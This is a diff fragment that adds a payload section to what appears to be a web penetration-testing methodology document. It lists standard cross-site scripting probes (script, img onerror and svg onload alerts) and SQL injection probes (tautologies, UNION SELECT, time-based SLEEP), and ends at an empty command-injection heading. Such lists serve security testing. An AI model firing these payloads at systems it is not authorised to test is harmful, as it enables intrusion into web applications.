@@ -159,3 +159,15 @@ For each endpoint/parameter discovered:
 ## KEY PAYLOADS & TECHNIQUES
 
 ### XSS Detection
+- <script>alert(1)</script>
+- <img src=x onerror=alert(1)>
+- javascript:alert(1)
+- "><svg/onload=alert(1)>
+
+### SQL Injection Detection
+- ' OR '1'='1
+- ' UNION SELECT NULL--
+- 1' AND SLEEP(5)--
+- ' OR 1=1#
+
+### Command Injection
